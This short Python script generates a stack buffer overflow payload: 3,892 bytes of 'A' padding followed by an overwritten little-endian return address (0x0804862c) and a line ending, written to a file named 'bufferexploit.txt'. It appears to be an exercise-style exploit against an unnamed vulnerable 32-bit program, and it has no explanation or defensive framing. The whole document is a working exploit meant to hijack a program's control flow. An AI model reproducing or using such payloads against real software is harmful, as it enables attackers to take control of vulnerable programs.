

filler = ''

for i in range(0, 3891 + 1):
    filler += '41'

returnaddress = '2c' + '86' + '04' + '08' + '00' + '00' + '00' + '00' + '00'

newline = '0d' + '0a'

rawdata = bytes.fromhex(filler + returnaddress + newline)

with open("bufferexploit.txt", "wb") as file:
    file.write(rawdata)
	
